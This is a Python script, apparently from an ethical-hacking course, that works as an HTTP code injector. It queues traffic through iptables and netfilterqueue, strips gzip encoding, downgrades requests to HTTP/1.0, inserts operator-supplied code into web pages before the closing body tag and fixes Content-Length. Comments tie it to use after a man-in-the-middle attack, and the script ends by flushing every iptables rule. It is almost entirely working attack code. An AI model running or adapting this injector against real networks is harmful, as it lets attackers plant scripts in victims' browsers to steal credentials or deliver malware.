# Created by FoxSinOfGreed1729
# Many Thanks to Zaid Sabih and Udemy.com
import os
import netfilterqueue
import scapy.all as scapy
import re

code = "<h1> Sly Fluffy Fox </h1>"


def process_packet(packet):
    global modified_load
    global content_len
    scapy_packet = scapy.IP(packet.get_payload())
    # converting the packet into a scapy packet because its more versatile and more useful
    if scapy_packet.haslayer(scapy.Raw):
        # We're checking for RAW layer, as all data sent over HTTP is placed in the RAW layer
        # if Dport is http it is a HTTP request
        # if Sport is http it is a HTTP response
        # if scapy_packet[scapy.TCP].dport == 443:
        #     print("[+] HTTPS Request")
        #     print(scapy_packet.show())
        # if scapy_packet[scapy.TCP].sport == 443:
        #     print("[+] HTTPS Response")
        #     print(scapy_packet.show())
        load_str = scapy_packet[scapy.Raw].load.decode()
        if scapy_packet[scapy.TCP].dport == 80:
            # we're checking if it's a request
            print("[+] Request")
            # so, theres this field in the load which says accept encoding
            # If the accept encoding is set to Gzip in request,
            # then the server sends us Gzip encoded HTML shiz
            # so first off, we need to disable that
            # so we will use regex
            # the regex is Accept-Encoding:.*?\\n
            # this chooses Accept-Encoding: then a number of characters, then ? is for non greedy
            # then a \r and \n. the \\ is because \ is spl char
            modified_load = re.sub("Accept-Encoding:.*?\\n", "", load_str)
            print("[+] Removed Encoding")
            # replacing our Accept-Encoding:.*?\\r\\n with nothing, ie removing it
            modified_load = modified_load.replace("HTTP/1.1", "HTTP/1.0")
            print("[+] Changed HTTP 1.1 to HTTP 1.0")
            # we might notice that the websites do not load properly
            # This happens when HTTP 1.1 is used 
            # This allows Server to send responses in chunks
            # This causes error in recalculating page length
            # So instead of using HTTP 1.1 which gives out in chunks
            # We'll sedit the response as well and send out the request in 1.0
            # and HTTP 1.0 does not use chunks so our program will work

        elif scapy_packet[scapy.TCP].sport == 80:
            # we're checking if it's a response
            print("[+] Response")
            modified_load = load_str.replace("</body>", code + "</body>")
            content_len = re.search("(?:Content-Length:\s)(\d*)", load_str)
            if content_len and "text/html" in load_str:
                content_len = content_len.group(1)
                new_len = int(content_len) + len(code)
                modified_load = modified_load.replace(content_len, str(new_len))
                print("[+] Modified Length of page")

        if load_str != scapy_packet[scapy.Raw].load:
            mod_pack = set_load(scapy_packet, modified_load.encode())
            # print(mod_pack)
            packet.set_payload(bytes(mod_pack))
            
    print("[+] Spoof complete")
    packet.accept()


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def main():
    global code

    # packets go into the FORWARD chain only if they're coming from another computer.
    # so the line below is for when you've successfully completed an MITM attack
    # os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    # here we're taking all packets in the FORWARD and putting them into a queue with index no 0

    # packets go into the OUTPUT chain when they're coming from your own computer.
    # so the line below is for when you wanna modify packets you're sending to some place
    os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
    # the first statement queues up the requests from machine to server
    # the second statement queues up the requests from server to machine

    queue = netfilterqueue.NetfilterQueue()
    # queuing up the packets together so that we can modify them
    queue.bind(0, process_packet)
    # This allows us to connect/bind to the queue created in the command
    # queue.bind(0, process_packet)
    # The process packet will be called  and the 0 is the id of queue in the command
    c = input("1. Use code from file inject.txt(F/f)\n2. Type or Paste code here (T/t)\n")
    if c == 'T' or c == 't':
        code = input()
    elif c == 'F' or c == 'f':
        f = open("inject.txt", "r")
        code = f.read()
    else:
        print("Please enter correct option")
    print("Code that will be injected is\n", code)
    print("\n[+] Script Running\n")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt detected, quitting...")
    except:
        print("[-] Some Error has occurred, quitting")

    # we even have to restore our IPtables rules back to normal
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    print("[+] IPtables restored to normal")


main()
